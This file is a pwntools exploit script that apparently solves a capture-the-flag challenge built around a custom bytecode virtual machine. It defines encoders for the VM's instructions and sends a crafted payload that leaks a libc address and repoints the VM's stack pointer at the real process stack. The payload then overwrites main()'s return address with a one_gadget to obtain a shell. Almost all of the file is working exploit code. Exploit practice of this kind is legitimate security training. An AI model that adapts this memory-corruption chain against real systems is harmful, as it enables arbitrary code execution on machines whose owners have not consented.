#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./vm_chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './vm_chall')
libc = exe.libc

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py REMOTE=127.0.0.1:3000

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        (host, port) = args.REMOTE.split(':')
        return connect(host, port)
    elif args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue

b *main+1695
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

# NOTE: please run pwninit first.

def reg2int(reg: str) -> int:
    return ord(reg[1]) - ord("0")
def asm_push(val: int | str):
    if isinstance(val, int):
        return p8(0x31) + p8(val)
    else:
        return p8(0x32) + p8(reg2int(val))
def asm_pop(reg: str):
    return p8(0x33) + p8(reg2int(reg))
def asm_mov(dst: str, src: str):
    return p8(0x34) + p8(reg2int(dst)) + p8(reg2int(src))
def asm_imm(reg: str, val: int, sign: str = "unsigned"):
    return p8(0x35) + p8(reg2int(reg)) + p64(val, sign=sign)
def asm_memcpy(dst: str, src: str, len: int):
    return p8(0x36) + p8(reg2int(dst)) + p8(reg2int(src)) + p16(len+1)
def asm_and(dst: str, src: str):
    return p8(0x37) + p8(reg2int(dst)) + p8(reg2int(src))
def asm_or(dst: str, src: str):
    return p8(0x38) + p8(reg2int(dst)) + p8(reg2int(src))
def asm_xor(dst: str, src: str):
    return p8(0x39) + p8(reg2int(dst)) + p8(reg2int(src))
def asm_not(reg: str):
    return p8(0x40) + p8(reg2int(reg))
def asm_shr(reg: str, amount: int):
    return p8(0x41) + p8(reg2int(reg)) + p8(amount)
def asm_shl(reg: str, amount: int):
    return p8(0x42) + p8(reg2int(reg)) + p8(amount)
def asm_add(dst: str, src: str):
    return p8(0x43) + p8(reg2int(dst)) + p8(reg2int(src))
def asm_sub(dst: str, src: str):
    return p8(0x44) + p8(reg2int(dst)) + p8(reg2int(src))
def asm_jmp(addr: int):
    return p8(0x45) + p8(addr)
# this function modifies the stack, so use with caution
def asm_short_imm(reg: str, val: int):
    return asm_push(val) + asm_pop(reg)


io = start()

io.sendlineafter(b"[ lEn? ] >> ", b"1")
io.sendlineafter(b"[ BYTECODE ] >>", b"a")

io.sendlineafter(b"[ lEn? ] >> ", b"1")
io.sendlineafter(b"[ BYTECODE ] >>", b"a")


payload = flat(
    # ---------- Part 1: Copy vm data into stack ---------- 

    # Make room in the stack so we can pop later
    asm_push(0) * 14,

    # Copy vm data into the top of the stack
    asm_short_imm("r0", 0xef),
    asm_short_imm("r1", 0xff),
    asm_memcpy("r0", "r1", 128),

# LABEL_1:

    # r5 = vm.pc, r6 = main_arena+96
    asm_pop("r5"),
    asm_pop("r0") * 11,
    asm_pop("r6"),

    # ---------- Part 2: Assign vm.stack = __libc_argv ---------- 

    # setup r2 (vm.pc) = LABEL_2
    asm_imm("r2", 87), # NOTE: Make sure to calculate LABEL_2 - LABEL_1 offset and put it in here
    asm_add("r2", "r5"),

    # setup r3 (vm.stack) = __libc_argv
    asm_imm("r3", libc.symbols["__libc_argv"] - (libc.symbols["main_arena"] + 96) - 8),
    asm_add("r3", "r6"),

    # setup r4 (vm.end) = 0xffffffffffffffff
    asm_imm("r4", 0xffffffffffffffff),

    # write r2, r3, r4 into vm.pc, vm.stack, vm.end
    asm_imm("r0", 0xfa),
    asm_imm("r1", 0xff),
    asm_memcpy("r0", "r1", 88),

# LABEL_2:

    # ---------- Part 3: Assign vm.stack = stack address ---------- 

    # setup r2 (vm.pc) = LABEL_3
    asm_imm("r2", 117), # NOTE: Make sure to calculate LABEL_3 - LABEL_1 offset and put it in here
    asm_add("r2", "r5"),

    # setup r3 (vm.stack) = stack address
    asm_pop("r3"),

    # setup r4 (vm.end) = 0xffffffffffffffff
    asm_imm("r4", 0xffffffffffffffff),

    # write r2, r3, r4 into vm.pc, vm.stack, vm.end
    # asm_imm("r0", 0xfa),
    # asm_imm("r1", 0xff),
    asm_memcpy("r0", "r1", 88),
    
# LABEL_3:

    # ---------- Part 4: Overwrite the stack ---------- 

    # vm.stack is now pointing to the stack! We can overwrite the stack now!

    asm_push(0) * 36,

    # Write one_gadget into the return address of main()
    asm_imm("r0", 0xe4d70 -(libc.symbols["main_arena"] + 96), sign="signed"),
    asm_add("r0", "r6"),
    asm_push("r0"),
)

print(f"len of payload: {len(payload)}")
assert len(payload) < 256

io.sendlineafter(b"[ lEn? ] >> ", str(len(payload)).encode())
io.sendlineafter(b"[ BYTECODE ] >>", payload)

io.interactive()

